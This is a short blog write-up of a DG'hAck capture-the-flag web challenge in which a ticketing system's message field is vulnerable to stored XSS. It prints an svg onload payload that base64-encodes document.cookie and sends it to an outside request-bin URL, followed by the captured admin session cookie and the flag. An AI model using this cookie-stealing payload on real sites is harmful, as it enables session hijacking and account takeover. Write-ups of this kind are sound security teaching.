---
title: "Writeup DG'hAck: Internal Support 1"
date: 2020-11-19T03:19:55+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :

[![The ticketing system](/assets/dghack/internal-support-1.png)](/assets/dghack/internal-support-1.png)

Trying a classic xss (`<script>alert(1)</script>`) in the message field seems to work. We know that we have to login as an admin user, so let's try stealing the cookies :

```html
<svg onload="document.body.innerHTML=document.body.innerHTML.concat('<img src=\'https://eni7j9jobszxl.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))" />
```

After a few seconds, we get a request on our [request bin](https://requestbin.com/), which when decoded gives us the admin cookie :

```
session=.eJwlTstqwzAQ_BWhcyh67UryV_RegllJu7GpGxfLOYX8exV6GubBzDz1LBv1hbuevp5anQP0D_dON9YX_bkxdVbbflPrXZ27olqHqc5l7ep3ZD709XW9jJKD-6Kn83jwYGvTk84VfCkhQ7NoI7GLVhJF8hhNDcEEtFnQCOWYoIENURoKtoQ1coiGjA8sAi65VFMBahElo1gStozZZxYKxgGERpliDNYTChQoBkuDcX9-dD7-39hBaz9kPvdvvg-hgpTkjBPyb_RUGZhqhOxbDqW9h5EI9OsP9hJWpw.X7XZVw.vQUecnJN2gaDUDDYuPeB5LNZbbg
```

Logging in using that cookie reveals this todo-list :

[![The admin's todo list](/assets/dghack/internal-support-1-todo.png)](/assets/dghack/internal-support-1-todo.png)

Which contains the flag: `NoUserValidationIsADangerousPractice`.

---

[View all of the DG'hAck articles](/tags/dghack).
